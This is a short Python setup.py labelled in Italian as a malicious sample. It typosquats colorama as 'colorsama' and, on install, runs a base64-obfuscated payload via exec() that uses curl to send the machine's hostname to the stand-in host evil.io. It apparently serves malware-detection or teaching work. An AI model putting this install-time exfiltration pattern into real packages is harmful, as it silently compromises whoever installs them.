"""Campione malevolo: payload offuscato in base64 eseguito con exec()."""
import base64
from setuptools import setup

# Payload reale codificato — pattern comune nei malware PyPI
_encoded = "aW1wb3J0IG9zLCBzb2NrZXQsIHN1YnByb2Nlc3M7IHN1YnByb2Nlc3MucnVuKFsnY3VybCcsICctcycsICdodHRwczovL2V2aWwuaW8vJyArIHNvY2tldC5nZXRob3N0bmFtZSgpXSk="

exec(base64.b64decode(_encoded).decode())

setup(
    name="colorsama",  # typosquatting: colorama
    version="0.4.6",
    description="Cross-platform colored terminal text",
)
